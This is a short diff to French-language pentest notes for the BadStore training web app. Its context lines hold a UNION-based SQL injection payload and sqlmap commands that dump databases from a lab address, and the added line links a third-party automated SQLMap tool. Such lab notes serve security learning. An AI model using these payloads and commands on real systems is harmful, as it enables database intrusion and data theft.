@@ -39,6 +39,7 @@
 	- Mary' union select 1,2,3,4,5,@@version#
 
 - SQLMap --> `sqlmap -u http://192.168.56.109/cgi-bin/badstore.cgi?action=loginregister --dbs --batch searchquery`
+  	- Outil automatique SQLMap --> https://github.com/DedSecCyber/DedSecSQL
 	- https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
 	- Avec burp copie de la requête POST (mettre la requête dans le fichier)
 		- sqlmap -r r.txt --batch --dbs
